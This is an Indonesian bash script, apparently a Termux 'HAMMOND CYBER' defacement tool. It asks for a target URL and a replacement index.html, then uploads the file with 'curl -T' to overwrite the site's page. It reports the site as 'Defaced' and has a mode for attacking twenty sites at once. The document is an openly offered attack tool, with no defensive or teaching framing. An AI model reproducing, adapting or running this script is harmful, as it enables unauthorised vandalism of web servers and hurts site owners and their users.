...
echo
echo
toilet -f future "    TebasIndex" | lolcat
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo $yellow
figlet -f future "HAMMOND CYBER"
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo
...
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"hmmd"$cyan" ~/DOH"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo
echo $red "Simpan SC Deface Kalian Di Memory Internal Di Luar Folder "
echo
echo $yellow "Target Yang bisa Kalian Deface"
...
echo
echo $red "Pilih Salah Satu Target Disana Lalu Paste Dibawah."
echo $green "╭─"$blue"TnSadboys"$cyan" ~/DUH"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Scriptnya Gans: "
echo $green "╭─"$blue"hmmd"$cyan" ~/Nama SC Harus (index.html) ganti dulu sana"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$yellow"Defaced"$red"]"$cyan"～～～＞"$green" $target"
echo
...
echo $cyan "Deface Rombongan Sebanyak 20 Website"
echo
...
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"TnSadboys"$cyan" ~/DOH"$white                               
read -p " ╰─$ " script
echo
echo
...
echo $white "╭─"$green"TnSadboys"$cyan" ~/WikWik"$white
read -p " ╰─$ " target3
...
echo $white "╭─"$green"hmmd"$cyan" ~/WikWik"$white
read -p " ╰─$ " target5
...
echo $white "╭─"$green"hmmd"$cyan" ~/DOH"$white
read -p " ╰─$ " target7
...
echo $white "╭─"$green"hmmd"$cyan" ~/Crot"$white
read -p " ╰─$ " target12
...
echo
echo $red"[+] Allah SWT "
echo $white"[+] HAMMOND CYBER"
echo $red"[+] All Member [D.O.H] "
echo $red"##########################$green" WELCOME "$red###########################"
...
if [ $apaan = "Q" ] || [ $apaan = "q" ]
then
echo " Jangan Dipakek Coli Ini tols nebas "
exit
clear
fi
